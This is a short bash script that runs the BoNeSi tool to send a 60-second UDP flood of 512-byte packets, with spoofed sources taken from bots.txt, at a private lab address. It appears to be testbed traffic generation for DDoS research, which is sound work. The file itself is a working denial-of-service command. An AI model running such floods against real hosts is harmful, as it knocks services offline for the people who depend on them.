#!/bin/bash

# BoNeSi UDP Flood (512 bytes) (60 seconds)
sudo timeout -s INT 60 bonesi -i bots.txt -p udp -s 512 192.168.100.2:50001